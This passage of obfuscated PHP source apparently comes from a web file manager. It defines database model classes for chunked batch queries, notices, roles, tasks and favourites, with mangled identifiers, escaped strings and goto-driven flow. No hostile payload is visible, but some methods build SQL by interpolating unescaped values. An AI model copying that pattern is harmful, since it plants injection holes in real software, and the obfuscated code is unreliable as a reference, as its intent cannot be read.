count($¬∆˙€ŒÇ); for ($üåªä¬ô = 0; $üåªä¬ô < $ú·ê©”∫; $üåªä¬ô++) { $ãôªªÕπ = $¬∆˙€ŒÇ[$üåªä¬ô]; if (!is_array($ãôªªÕπ) || count($ãôªªÕπ) != 4) { continue; } $÷¨∞âÓ› = "\x55\120\104\x41\124\x45\40\x60{$œ˝áßÓÜ}\140\x20\x53\x45\124\x20{$ãôªªÕπ[2]}\40\x3d\40\x43\x41\x53\x45\x20{$ãôªªÕπ[0]}\x20\xa"; if ($Ò µ•ßô == 0) { $≤–†çÉƒ = $÷¨∞âÓ›; } $ÖÓø˘ÍÆ[] = $îëæ˛ë’[127] . $ãôªªÕπ[1] . $îëæ˛ë’[127]; $Ò µ•ßô++; $≤–†çÉƒ .= "\x20\127\110\105\116\x20\47{$ãôªªÕπ[1]}\x27\x20\124\x48\x45\x4e\40\x27{$ãôªªÕπ[3]}\x27\40\xa"; if ($Ò µ•ßô == $ä˙˚Ö≤à || $üåªä¬ô == $ú·ê©”∫ - 1) { $Éóüƒ–à = implode($îëæ˛ë’[50], $ÖÓø˘ÍÆ); $≤–†çÉƒ .= "\x20\105\x4e\x44\x20\40\127\110\x45\x52\x45\x20{$ãôªªÕπ[0]}\x20\111\116\x20\x28{$Éóüƒ–à}\51\x20"; $this->execute($≤–†çÉƒ); $Ò µ•ßô = 0; $≤–†çÉƒ = $÷¨∞âÓ›; $this->chunkEventCheck(count($ÖÓø˘ÍÆ)); $ÖÓø˘ÍÆ = array(); } } $this->chunkEventSet(); } public function saveAllEach($›Óèôø£) { $∆å∫‹◊‡ =& $_SERVER[ëæªã÷]; $âãú’˙Á = $this->tablePrefix . $this->tableName; foreach ($›Óèôø£ as $ÏêÙÏ÷á) { if (!is_array($ÏêÙÏ÷á) || count($ÏêÙÏ÷á) != 4) { continue; } $äòÏó≠“ = $ÏêÙÏ÷á[0] . $∆å∫‹◊‡[383] . $ÏêÙÏ÷á[1] . $∆å∫‹◊‡[127]; $«ÉÂ√ô˛ = $ÏêÙÏ÷á[2] . $∆å∫‹◊‡[383] . $ÏêÙÏ÷á[3] . $∆å∫‹◊‡[127]; $‹áä»Œ∏ = "\165\x70\x64\x61\164\x65\x20{$âãú’˙Á}\x20\163\x65\164\40{$«ÉÂ√ô˛}\40\x77\150\145\x72\x65\x20{$äòÏó≠“}\x3b"; $this->execute($‹áä»Œ∏); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($…ﬁîﬂûÆ = false, $ÇëÑ◊∫è = false) { $this->_chunkEvent = $…ﬁîﬂûÆ; $this->_chunkEventParam = $ÇëÑ◊∫è; } private function chunkEventCheck($¡˚ÜƒÀÉ) { if (!$this->_chunkEvent) { return; } $Ã‚Ë≠úá = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $Ã‚Ë≠úá[$_SERVER[ëæªã÷][384]] = $¡˚ÜƒÀÉ; Hook::trigger($this->_chunkEvent, $Ã‚Ë≠úá); } public function addAll($≤˚π¡’Ö, $ öò¬ç¥ = array(), $à‹≤©Ö‡ = false) { $âü‹Ω©Ú =& $_SERVER[ëæªã÷]; ignore_timeout(); $ŸØËÁÌÜ = self::SQL_WHERE_IN_CHUNK; if (empty($≤˚π¡’Ö)) { $this->error = think_lang($âü‹Ω©Ú[275]); return !1; } $ öò¬ç¥ = $this->_parseOptions($ öò¬ç¥); foreach ($≤˚π¡’Ö as $Ï≥ˆ∏£… => $·–œ°Öª) { $≤˚π¡’Ö[$Ï≥ˆ∏£…] = $this->_facade($·–œ°Öª); $this->_beforeInsert($≤˚π¡’Ö[$Ï≥ˆ∏£…], $ öò¬ç¥); } if (method_exists($this->db, $âü‹Ω©Ú[276])) { for ($íòòÑÿﬁ = 0; $íòòÑÿﬁ < count($≤˚π¡’Ö); $íòòÑÿﬁ += $ŸØËÁÌÜ) { $·Âèñ±¨ = array_slice($≤˚π¡’Ö, $íòòÑÿﬁ, $ŸØËÁÌÜ); if (!is_array($·Âèñ±¨) || count($·Âèñ±¨) == 0) { break; } $êåÇù¯Ú = $this->db->insertAll($·Âèñ±¨, $ öò¬ç¥, $à‹≤©Ö‡); $this->chunkEventCheck(count($·Âèñ±¨)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($≤˚π¡’Ö as $Ï≥ˆ∏£… => $·–œ°Öª) { $êåÇù¯Ú = $this->db->insert($·–œ°Öª, $ öò¬ç¥, $à‹≤©Ö‡); } $this->commit(); } if (!1 !== $êåÇù¯Ú) { $⁄Õ¸Ÿ§‰ = $this->getLastInsID(); if ($⁄Õ¸Ÿ§‰) { return $⁄Õ¸Ÿ§‰; } } return $êåÇù¯Ú; } public function save($∑ù˜àÛﬂ = '', $®µ‚¯‡Ù = array()) { $Èﬂ∞çä‰ =& $_SERVER[ëæªã÷]; $≈°ÿª“∏ = self::SQL_WHERE_IN_CHUNK; $ú∑∞’◊Ö = $this->optionsValue(); $˘∏ÈÂ”ˆ = $this->findWhereField($ú∑∞’◊Ö); if (!$˘∏ÈÂ”ˆ) { return parent::save($∑ù˜àÛﬂ, $®µ‚¯‡Ù); } $¶‡æ‘÷É = 0; $˝ˆçÎê´ = $ú∑∞’◊Ö[$Èﬂ∞çä‰[279]][$˘∏ÈÂ”ˆ][1]; $˝ˆçÎê´ = is_array($˝ˆçÎê´) ? $˝ˆçÎê´ : array(); $Ô∆∑∑ú§ = count($˝ˆçÎê´); for ($‰‚Åì‹„ = 0; $‰‚Åì‹„ < $Ô∆∑∑ú§; $‰‚Åì‹„ += $≈°ÿª“∏) { $Õ†Öü˘ó = array_slice($˝ˆçÎê´, $‰‚Åì‹„, $≈°ÿª“∏); if (!is_array($Õ†Öü˘ó) || count($Õ†Öü˘ó) == 0) { break; } $ú∑∞’◊Ö[$Èﬂ∞çä‰[279]][$˘∏ÈÂ”ˆ][1] = $Õ†Öü˘ó; $this->optionsValue($ú∑∞’◊Ö); $¶‡æ‘÷É += parent::save($∑ù˜àÛﬂ, $®µ‚¯‡Ù); $this->chunkEventCheck(count($Õ†Öü˘ó)); } $this->chunkEventSet(); return $¶‡æ‘÷É; } public function add($ ”ﬂŸáæ = '', $‡ΩÚÑá‰ = array(), $âúÇîõ‰ = false) { if ($this->addTaskStatus && is_array($ ”ﬂŸáæ)) { $this->addTaskData[] = $ ”ﬂŸáæ; return; } return parent::add($ ”ﬂŸáæ, $‡ΩÚÑá‰, $âúÇîõ‰); } public function parseWhereLike($ı¨ö¶◊¢, $ÌÍ€ôÍÍ = '', $˘ìÚ®∫Ö = false, &$ºõı÷ö˜ = false) { $Ω˛çﬂï¥ =& $_SERVER[ëæªã÷]; $ÊÎª◊Ö⁄ = $GLOBALS[$Ω˛çﬂï¥[6]][$Ω˛çﬂï¥[385]]; if (!$ÊÎª◊Ö⁄[$Ω˛çﬂï¥[386]]) { return $ı¨ö¶◊¢; } if (!is_array($ı¨ö¶◊¢)) { return $ı¨ö¶◊¢; } $†‚Ã–âÀ = array(); $¶ﬁìµÅƒ = 0; foreach ($ı¨ö¶◊¢ as $óª≈â«ö => $‡ô∑ºÄ) { if (is_array($‡ô∑ºÄ) && count($‡ô∑ºÄ) == 2 && $‡ô∑ºÄ[0] == $Ω˛çﬂï¥[387] && is_string($‡ô∑ºÄ[1]) && substr($‡ô∑ºÄ[1], 0, 1) == $Ω˛çﬂï¥[388] && substr($‡ô∑ºÄ[1], strlen($‡ô∑ºÄ[1]) - 1, 1) == $Ω˛çﬂï¥[388]) { $ºõı÷ö˜ = !0; $Æ…ﬂà≥æ = is_string($óª≈â«ö) ? $óª≈â«ö : $ÌÍ€ôÍÍ; $Œ∏„ß´≠ = substr($‡ô∑ºÄ[1], 1, strlen($‡ô∑ºÄ[1]) - 2); $Œ∏„ß´≠ = $this->db->escapeString($Œ∏„ß´≠); if (!strpos($Æ…ﬂà≥æ, $Ω˛çﬂï¥[10])) { $Æ…ﬂà≥æ = $Ω˛çﬂï¥[389] . $Æ…ﬂà≥æ . $Ω˛çﬂï¥[389]; } $ñê‚Û“ = $Ω˛çﬂï¥[191] . $Œ∏„ß´≠ . $Ω˛çﬂï¥[191]; if ($ÊÎª◊Ö⁄[$Ω˛çﬂï¥[390]]) { $ñê‚Û“ = $Ω˛çﬂï¥[391] . $Œ∏„ß´≠ . $Ω˛çﬂï¥[392]; if ($ÊÎª◊Ö⁄[$Ω˛çﬂï¥[393]]) { $ñê‚Û“ = $Ω˛çﬂï¥[392] . $Œ∏„ß´≠ . $Ω˛çﬂï¥[391]; } } $†‚Ã–âÀ[$¶ﬁìµÅƒ] = $Ω˛çﬂï¥[394] . $Æ…ﬂà≥æ . $Ω˛çﬂï¥[395] . $ñê‚Û“ . $Ω˛çﬂï¥[396]; $¶ﬁìµÅƒ++; continue; } if (is_array($‡ô∑ºÄ)) { $ÌÍ€ôÍÍ = is_string($óª≈â«ö) ? $óª≈â«ö : $ÌÍ€ôÍÍ; $‡ô∑ºÄ = $this->parseWhereLike($‡ô∑ºÄ, $ÌÍ€ôÍÍ, !0, $ºõı÷ö˜); } if (is_numeric($óª≈â«ö)) { $†‚Ã–âÀ[$¶ﬁìµÅƒ] = $‡ô∑ºÄ; $¶ﬁìµÅƒ++; } else { $†‚Ã–âÀ[$óª≈â«ö] = $‡ô∑ºÄ; } } if ($ºõı÷ö˜ && !$˘ìÚ®∫Ö) { } return $†‚Ã–âÀ; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ô¨å®’‹ = array()) { $ı›ú¶®Ù =& $_SERVER[ëæªã÷]; $Œ’¥≥ü» = self::SQL_WHERE_IN_CHUNK; $º“Å‰æÆ = $this->optionsValue(); $“Ù∑Ä˙Ø = $this->findWhereField($º“Å‰æÆ); if (!$“Ù∑Ä˙Ø || isset($º“Å‰æÆ[$ı›ú¶®Ù[296]]) || isset($º“Å‰æÆ[$ı›ú¶®Ù[357]])) { return parent::select($ô¨å®’‹); } $Ω˙à∆ßÔ = $º“Å‰æÆ[$ı›ú¶®Ù[279]][$“Ù∑Ä˙Ø][1]; $Ω˙à∆ßÔ = is_array($Ω˙à∆ßÔ) ? $Ω˙à∆ßÔ : array(); $ÿ©ëù∏Ä = null; for ($˜„®πæ† = 0; $˜„®πæ† < count($Ω˙à∆ßÔ); $˜„®πæ† += $Œ’¥≥ü») { $ÊîæÑõ´ = array_slice($Ω˙à∆ßÔ, $˜„®πæ†, $Œ’¥≥ü»); if (!is_array($ÊîæÑõ´) || count($ÊîæÑõ´) == 0) { break; } $º“Å‰æÆ[$ı›ú¶®Ù[279]][$“Ù∑Ä˙Ø][1] = $ÊîæÑõ´; $this->optionsValue($º“Å‰æÆ); $∆»˛∏—∂ = parent::select($ô¨å®’‹); if (!$∆»˛∏—∂) { continue; } $ÿ©ëù∏Ä = is_array($ÿ©ëù∏Ä) ? $ÿ©ëù∏Ä : array(); $ÿ©ëù∏Ä = array_merge($ÿ©ëù∏Ä, $∆»˛∏—∂); } return $ÿ©ëù∏Ä; } public function delete($›“—˘™á = array()) { $¬◊≠ßêü =& $_SERVER[ëæªã÷]; $èºË≠Â® = self::SQL_WHERE_IN_CHUNK; $‹â…ÔÒ≤ = $this->optionsValue(); $ÂÊ û¯∂ = $this->findWhereField($‹â…ÔÒ≤); if (!$ÂÊ û¯∂) { return parent::delete($›“—˘™á); } $ññË’≈à = 0; $å˚≤÷™Ñ = $‹â…ÔÒ≤[$¬◊≠ßêü[279]][$ÂÊ û¯∂][1]; $å˚≤÷™Ñ = is_array($å˚≤÷™Ñ) ? $å˚≤÷™Ñ : array(); for ($ƒìò÷ÈÁ = 0; $ƒìò÷ÈÁ < count($å˚≤÷™Ñ); $ƒìò÷ÈÁ += $èºË≠Â®) { $Úı…“⁄Ä = array_slice($å˚≤÷™Ñ, $ƒìò÷ÈÁ, $èºË≠Â®); if (!is_array($Úı…“⁄Ä) || count($Úı…“⁄Ä) == 0) { break; } $‹â…ÔÒ≤[$¬◊≠ßêü[279]][$ÂÊ û¯∂][1] = $Úı…“⁄Ä; $this->optionsValue($‹â…ÔÒ≤); $ññË’≈à += parent::delete($›“—˘™á); } return $ññË’≈à; } private function findWhereField($æß˚‰¢÷) { $‚Óé£¶Ì =& $_SERVER[ëæªã÷]; $ÙØﬂ‹≤© = self::SQL_WHERE_IN_CHUNK; if (!is_array($æß˚‰¢÷) || !is_array($æß˚‰¢÷[$‚Óé£¶Ì[279]])) { return !1; } foreach ($æß˚‰¢÷[$‚Óé£¶Ì[279]] as $Ï—±ö“© => $Ñ€úºùﬁ) { if (is_array($Ñ€úºùﬁ) && isset($Ñ€úºùﬁ[0]) && is_string($Ñ€úºùﬁ[0]) && strtolower($Ñ€úºùﬁ[0]) == $‚Óé£¶Ì[7] && is_array($Ñ€úºùﬁ[1]) && count($Ñ€úºùﬁ[1]) > $ÙØﬂ‹≤©) { ignore_timeout(); return $Ï—±ö“©; } } return !1; } public function setMasterDB($»ã†…Áµ = true) { think_config($_SERVER[ëæªã÷][397], $»ã†…Áµ); } } goto eæıœ¨¥¡ú; bﬁç–Â˜Ëã: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\56\156\157\164\x69\x63\145\114\x69\163\x74"; public $field = array("\156\141\x6d\x65", "\143\157\x6e\164\x65\156\164", "\141\165\x74\x68", "\x6d\x6f\x64\145", "\164\151\155\x65", "\164\171\160\x65", "\154\x65\166\x65\x6c", "\145\156\x61\x62\x6c\145", "\163\157\162\164"); public function listData($ôÅéùµ° = false, $≤òæ£—¢ = "\163\157\162\x74", $Ëº¥–ô« = false) { return parent::listData($ôÅéùµ°, $≤òæ£—¢, $Ëº¥–ô«); } public function add($˙Íó≈ ) { $Ç´˝Ωê∞ =& $_SERVER[ëæªã÷]; $™–ÆÙ¨ = time(); if ($˙Íó≈ [$Ç´˝Ωê∞[16]] == $Ç´˝Ωê∞[2210]) { $™–ÆÙ¨ = strtotime($˙Íó≈ [$Ç´˝Ωê∞[206]]); } $˙Íó≈ [$Ç´˝Ωê∞[206]] = $™–ÆÙ¨; return parent::insert($˙Íó≈ ); } public function update($€æ∞ÄÚü, $˙£ìæ°ã) { $ﬂ”ÒØÌÁ =& $_SERVER[ëæªã÷]; $Ñÿã⁄Ó˝ = $this->listData($€æ∞ÄÚü); if (!$Ñÿã⁄Ó˝) { return !1; } $•æ‹ÑÖ⁄ = time(); if ($˙£ìæ°ã[$ﬂ”ÒØÌÁ[16]] == $ﬂ”ÒØÌÁ[2210]) { $•æ‹ÑÖ⁄ = strtotime($˙£ìæ°ã[$ﬂ”ÒØÌÁ[206]]); } $˙£ìæ°ã[$ﬂ”ÒØÌÁ[206]] = $•æ‹ÑÖ⁄; return parent::update($€æ∞ÄÚü, $˙£ìæ°ã); } public function remove($ãÛù¬ ß) { $”˘Â◊—’ = $this->listData($ãÛù¬ ß); if (!$”˘Â◊—’ || $”˘Â◊—’[$_SERVER[ëæªã÷][1250]]) { return !1; } return parent::remove($ãÛù¬ ß); } public function sort($ÇÙŒä°, $˛‹≠Âò∂) { return parent::update($ÇÙŒä°, $˛‹≠Âò∂); } public function enable($î“Ï˘§å, $¨ôÚç——) { return parent::update($î“Ï˘§å, array($_SERVER[ëæªã÷][2211] => $¨ôÚç——)); } private function initUserOption() { $£µ∆∞“® =& $_SERVER[ëæªã÷]; $this->optionType = $£µ∆∞“®[2212]; $this->modelType = $£µ∆∞“®[2213]; $this->field = array($£µ∆∞“®[2214], $£µ∆∞“®[32], $£µ∆∞“®[206], $£µ∆∞“®[33], $£µ∆∞“®[2215], $£µ∆∞“®[730], $£µ∆∞“®[198]); } public function userNoticeGet($’Çºøº† = false) { $this->initUserOption(); return parent::listData($’Çºøº†, $_SERVER[ëæªã÷][401], !0); } public function userNoticeAdd($ÖÅ¢úπÛ) { $—π∂Éß¥ =& $_SERVER[ëæªã÷]; $this->initUserOption(); $ªõ˜õ¨§ = $this->findByKey($—π∂Éß¥[2214], $ÖÅ¢úπÛ[$—π∂Éß¥[401]]); if ($ªõ˜õ¨§) { return !0; } $ı‰úÏ¶è = array($—π∂Éß¥[2214] => $ÖÅ¢úπÛ[$—π∂Éß¥[401]], $—π∂Éß¥[32] => $ÖÅ¢úπÛ[$—π∂Éß¥[32]], $—π∂Éß¥[206] => $ÖÅ¢úπÛ[$—π∂Éß¥[206]], $—π∂Éß¥[33] => isset($ÖÅ¢úπÛ[$—π∂Éß¥[33]]) ? $ÖÅ¢úπÛ[$—π∂Éß¥[33]] : 1, $—π∂Éß¥[2215] => isset($ÖÅ¢úπÛ[$—π∂Éß¥[2215]]) ? $ÖÅ¢úπÛ[$—π∂Éß¥[2215]] : 0, $—π∂Éß¥[730] => 0, $—π∂Éß¥[198] => 0); return parent::insert($ı‰úÏ¶è); } public function userNoticeEdit($Á»∫≠‘∫, $¸°›—¿“) { $this->initUserOption(); return parent::update($Á»∫≠‘∫, $¸°›—¿“); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\x73\164\x65\x6d\x5f\x6f\160\x74\151\x6f\156"; protected $jsonField = array("\x6d\145\x6e\x75", "\162\x6f\x6c\145", "\162\x6f\154\x65\x47\162\x6f\165\160", "\x72\145\147\151\x73\x74", "\x65\155\141\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($ú÷∆‡â†) { return "\123\171\163\164\145\x6d\117\160\164\x69\157\156\137{$ú÷∆‡â†}"; } protected function optionDefault($ü∂§¨ ≥ = '') { $ÂÇß∫∂† =& $_SERVER[ëæªã÷]; if ($ü∂§¨ ≥ == $ÂÇß∫∂†[12]) { return $GLOBALS[$ÂÇß∫∂†[6]][$ÂÇß∫∂†[385]]; } } } class SystemRecordModel extends ModelBaseLight { } goto d•óÎø†‚¯; A…¶‡Úò™“: function binCheckBigger($√Óã∑†í, $Ü…î≥‹ﬂ) { return $√Óã∑†í > $Ü…î≥‹ﬂ; } $_SERVER[$_SERVER[‰µ∏ÇÕù][3]] = ("\67\71\67\66"."\x35\x35")+0;$_v3ub="kyseurm4gojdwcihafqt2bv7lp8zx1n03569equ9lv6w2md70zyrjxcpbag3osktn4f8h51i6ngs8tdh";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Ÿ˚ﬂ¿∆•, $àëå—∆¥) { $·˙∆⁄†ò =& $_SERVER[ëæªã÷]; if (isset(self::$_methodList[$Ÿ˚ﬂ¿∆•])) { return @call_user_func_array(self::$_methodList[$Ÿ˚ﬂ¿∆•], $àëå—∆¥); } else { if (method_exists($this, $Ÿ˚ﬂ¿∆•)) { return call_user_func_array(array($this, $Ÿ˚ﬂ¿∆•), $àëå—∆¥); } else { think_exception(__CLASS__ . $·˙∆⁄†ò[4] . $Ÿ˚ﬂ¿∆• . $·˙∆⁄†ò[5]); } } } public static function __callStatic($ç√Ìì§∞, $…·Ë¿≤æ) { if (isset(self::$_methodListStatic[$ç√Ìì§∞])) { return call_user_func_array(self::$_methodListStatic[$ç√Ìì§∞], $…·Ë¿≤æ); } else { if (method_exists(self, $ç√Ìì§∞)) { return call_user_func_array(array(self, $ç√Ìì§∞), $…·Ë¿≤æ); } else { show_json("{$ç√Ìì§∞}\50\51\40\x6e\x6f\x74\40\145\x78\151\x73\x74\73", !1); } } } public static function addMethod($©œ⁄ó„«, $÷ãÃÆ⁄Ÿ) { self::$_methodList[$©œ⁄ó„«] = $÷ãÃÆ⁄Ÿ; } public static function addMethodStatic($ÿ¬÷Üˆó, $⁄ûπíüÊ) { self::$_methodListStatic[$ÿ¬÷Üˆó] = $⁄ûπíüÊ; } } goto F®–Ï≥ÑΩ≤; d•óÎø†‚¯: class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\56\162\x6f\154\x65\x4c\x69\x73\164"; public $field = array("\156\141\155\145", "\x61\x75\164\150", "\154\141\x62\x65\x6c", "\144\x69\163\x70\154\141\x79", "\x73\171\163\164\145\155", "\x64\x65\163\143", "\x69\x67\x6e\157\162\145\105\170\164", "\x69\x67\156\157\162\145\106\151\154\x65\x53\151\172\x65", "\141\x64\155\x69\x6e\151\x73\164\162\x61\164\157\x72", "\x73\x6f\x72\x74"); public function listData($°÷ÙËÌÏ = false, $úúì˛¡æ = "\x73\x6f\x72\164", $˝—≤ØÄ⁄ = false) { $„®çﬁ˝§ =& $_SERVER[ëæªã÷]; $ƒÎõµœÅ = parent::listData($°÷ÙËÌÏ, $úúì˛¡æ, $˝—≤ØÄ⁄); if (!$°÷ÙËÌÏ) { foreach ($ƒÎõµœÅ as $π¡†Ωˆø => $ÓÕ≈˘†‚) { if ($ÓÕ≈˘†‚[$„®çﬁ˝§[1989]] == 1) { $ƒÎõµœÅ[$π¡†Ωˆø][$„®çﬁ˝§[451]] = LNG($„®çﬁ˝§[2216]); } } } return $ƒÎõµœÅ; } public function update($œúéﬂõÉ, $ÓÕŒÂôØ) { $›û€ïª‰ =& $_SERVER[ëæªã÷]; $ˆ±»èﬂ» = parent::listData($œúéﬂõÉ); $§î‹≤∑ê = $this->findByName($ÓÕŒÂôØ[$›û€ïª‰[32]]); if (!$ˆ±»èﬂ» || $§î‹≤∑ê && $§î‹≤∑ê[$›û€ïª‰[401]] != $ˆ±»èﬂ»[$›û€ïª‰[401]]) { return !1; } if ($§î‹≤∑ê[$›û€ïª‰[1989]] == 1) { $ÓÕŒÂôØ = array($›û€ïª‰[32] => $ÓÕŒÂôØ[$›û€ïª‰[32]], $›û€ïª‰[1818] => $ÓÕŒÂôØ[$›û€ïª‰[1818]]); } $this->filterAuth($ÓÕŒÂôØ[$›û€ïª‰[414]]); return parent::update($œúéﬂõÉ, $ÓÕŒÂôØ); } public function remove($‚‚˘ã∫˜) { $√Óç¯ÔŒ = parent::listData($‚‚˘ã∫˜); if (!$√Óç¯ÔŒ || $√Óç¯ÔŒ[$_SERVER[ëæªã÷][1250]]) { return !1; } return parent::remove($‚‚˘ã∫˜); } public function add($–ÄëˆÒå) { $Ì—ﬂã´É =& $_SERVER[ëæªã÷]; $ﬂ®Ò¸èÓ = $–ÄëˆÒå[$Ì—ﬂã´É[32]]; if ($this->findByName($ﬂ®Ò¸èÓ)) { return !1; } $“Ωõ£í„ = array($Ì—ﬂã´É[421] => $ﬂ®Ò¸èÓ, $Ì—ﬂã´É[1802] => $Ì—ﬂã´É[12], $Ì—ﬂã´É[1798] => $Ì—ﬂã´É[1806], $Ì—ﬂã´É[2217] => 1, $Ì—ﬂã´É[1801] => 0, $Ì—ﬂã´É[2218] => 0, $Ì—ﬂã´É[1800] => $this->getSort()); $–ÄëˆÒå = array_merge($“Ωõ£í„, $–ÄëˆÒå); $this->filterAuth($–ÄëˆÒå[$Ì—ﬂã´É[414]]); return parent::insert($–ÄëˆÒå); } private function getSort() { $„√√Ú˘˜ =& $_SERVER[ëæªã÷]; $œΩä¸ü¬ = parent::listData(); $ô¶©≈±” = array_to_keyvalue($œΩä¸ü¬, $„√√Ú˘˜[12], $„√√Ú˘˜[1819]); return empty($ô¶©≈±”) ? 0 : max($ô¶©≈±”) + 1; } private function filterAuth(&$ÍïÀ¢…«) { $ì ˛∞Æï =& $_SERVER[ëæªã÷]; $à‰¸Œ™ = array(); $‘™ëíˆ– = array_filter(explode($ì ˛∞Æï[50], $ÍïÀ¢…«)); foreach ($‘™ëíˆ– as $ÍïÀ¢…«) { $∏≈Òºªâ = explode($ì ˛∞Æï[10], $ÍïÀ¢…«); if ($∏≈Òºªâ[0] == $ì ˛∞Æï[2219] && $∏≈Òºªâ[1] != $ì ˛∞Æï[1169]) { $≈ò˛∂ºå = $∏≈Òºªâ[0] . $ì ˛∞Æï[10] . $∏≈Òºªâ[1] . $ì ˛∞Æï[2220]; if (!in_array($≈ò˛∂ºå, $‘™ëíˆ–)) { $à‰¸Œ™[] = $≈ò˛∂ºå; } } $à‰¸Œ™[] = $ÍïÀ¢…«; } $ÍïÀ¢…« = implode($ì ˛∞Æï[50], $à‰¸Œ™); } public function sort($ÚíòÂ˘°, $∂ÏÌÄ≠µ) { return parent::update($ÚíòÂ˘°, $∂ÏÌÄ≠µ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\155\x2e\164\x61\163\x6b\114\151\163\x74"; public $field = array("\156\141\x6d\x65", "\164\x79\160\x65", "\145\x76\x65\156\164", "\164\151\x6d\145", "\144\x65\x73\x63", "\163\171\x73\x74\145\155", "\x65\156\x61\x62\154\x65", "\x6c\x61\x73\164\122\x75\x6e", "\x73\x6f\162\164"); public function listData($â≈•œ˙Ê = false, $ÔøÃØ∑ã = "\163\x6f\x72\x74", $§ÄÓó‡‘ = false) { return parent::listData($â≈•œ˙Ê, $ÔøÃØ∑ã, $§ÄÓó‡‘); } public function add($ˆÍÁ·πâ) { $ñØ˛›ñé =& $_SERVER[ëæªã÷]; $ÓùΩ∫’Å = $this->findByName($ˆÍÁ·πâ[$ñØ˛›ñé[32]]); if ($ÓùΩ∫’Å) { return !1; } $ˆÍÁ·πâ[$ñØ˛›ñé[1589]] = 0; $ˆÍÁ·πâ[$ñØ˛›ñé[1819]] = $this->getSort(); return parent::insert($ˆÍÁ·πâ); } private function getSort() { $˜øπ∂∞Ë =& $_SERVER[ëæªã÷]; $©≤ûÇ‘Ü = parent::listData(); $«®±∆†Ö = array_to_keyvalue($©≤ûÇ‘Ü, $˜øπ∂∞Ë[12], $˜øπ∂∞Ë[1819]); return empty($«®±∆†Ö) ? 0 : max($«®±∆†Ö) + 1; } public function update($ˆΩÈ«˘è, $˙ˆØ∏åã) { $øÄÚñ¬˝ =& $_SERVER[ëæªã÷]; $≈¸àÅˆπ = $this->listData($ˆΩÈ«˘è); $Ê£õ‘á· = $this->findByName($˙ˆØ∏åã[$øÄÚñ¬˝[32]]); if (!$≈¸àÅˆπ || $Ê£õ‘á· && $Ê£õ‘á·[$øÄÚñ¬˝[401]] != $≈¸àÅˆπ[$øÄÚñ¬˝[401]]) { return !1; } return parent::update($ˆΩÈ«˘è, $˙ˆØ∏åã); } public function remove($åÛÖ™∏‰, $…ÍÌÿªå = false) { $¯ı¥ﬂ«¥ =& $_SERVER[ëæªã÷]; $†â†ØŒá = $this->listData($åÛÖ™∏‰); if (!$†â†ØŒá) { return; } if (!$…ÍÌÿªå && $†â†ØŒá[$¯ı¥ﬂ«¥[1250]] == $¯ı¥ﬂ«¥[99]) { return !1; } return parent::remove($åÛÖ™∏‰); } public function enable($È¸¢¥∫Ú, $ÿæπñ‡®) { return $this->update($È¸¢¥∫Ú, array($_SERVER[ëæªã÷][2211] => $ÿæπñ‡®)); } public function run($Ûÿ™ì·º) { return $this->update($Ûÿ™ì·º, array($_SERVER[ëæªã÷][2221] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\x65\162\x5f\146\x61\x76"; protected function cacheFunctionAlias($ ∆ñ·ü) { $öÏƒ€≤ =& $_SERVER[ëæªã÷]; return array($öÏƒ€≤[1904] => array(USER_ID, $öÏƒ€≤[2222])); } protected function listData() { $®⁄≈’Û˘ =& $_SERVER[ëæªã÷]; $…⁄ì⁄™ë = array($®⁄≈’Û˘[1619] => USER_ID, $®⁄≈’Û˘[483] => 0); $¨πÅ‰Ùé = $®⁄≈’Û˘[2223]; $Ãèã˜ä¬ = $this->field($¨πÅ‰Ùé)->where($…⁄ì⁄™ë)->order($®⁄≈’Û˘[2224])->select(); return $Ãèã˜ä¬ ? $Ãèã˜ä¬ : array(); } protected function resetCache() { } protected function listView() { $µÔå´ñÍ =& $_SERVER[ëæªã÷]; $ÿÆ§Ãëé = $this->listData(); $÷∑ÍÂ¶ = array_filter_by_field($ÿÆ§Ãëé, $µÔå´ñÍ[33], $µÔå´ñÍ[417]); $„¶è»À√ = array_to_keyvalue($÷∑ÍÂ¶, $µÔå´ñÍ[12], $µÔå´ñÍ[88]); if (!$„¶è»À√) { return $ÿÆ§Ãëé; } $ÌâÌÏÚ = 2000; $˚¥ı§ˆï = array($µÔå´ñÍ[418] => array($µÔå´ñÍ[419], $„¶è»À√)); $ÅÍæÈöŸ = Model($µÔå´ñÍ[805])->listSource($˚¥ı§ˆï, $ÌâÌÏÚ); $ÅÍæÈöŸ = array_merge($ÅÍæÈöŸ[$µÔå´ñÍ[86]], $ÅÍæÈöŸ[$µÔå´ñÍ[87]]); $ÅÍæÈöŸ = array_to_keyvalue($ÅÍæÈöŸ, $µÔå´ñÍ[403]); foreach ($ÿÆ§Ãëé as $†ä•ƒ˘Ì => $∞ì—€§·) { $˘¸√â‡¬ = $ÅÍæÈöŸ[$∞ì—€§·[$µÔå´ñÍ[88]]]; $˘¸√â‡¬ = $˘¸√â‡¬ ? $˘¸√â‡¬ : array(); $ÿÆ§Ãëé[$†ä•ƒ˘Ì] = array_merge($˘¸√â‡¬, $∞ì—€§·); } return $ÿÆ§Ãëé; } protected function addFav($É∫ÉæàÅ, $ÈÚø˚¥≈ = '', $ÇÓ¬ËÖê = "\x73\157\165\162\143\145") { $∑”ñ∏ÁΩ =& $_SERVER[ëæªã÷]; $≈ª›Àº = array($∑”ñ∏ÁΩ[1619] => USER_ID, $∑”ñ∏ÁΩ[483] => 0, $∑”ñ∏ÁΩ[423] => $ÇÓ¬ËÖê, $∑”ñ∏ÁΩ[422] => $É∫ÉæàÅ); if ($this->where($≈ª›Àº)->find()) { return !1; } $≈ª›Àº = array($∑”ñ∏ÁΩ[1619] => USER_ID, $∑”ñ∏ÁΩ[483] => 0); $®ª≤›á… = $this->where($≈ª›Àº)->max($∑”ñ∏ÁΩ[1819]); if 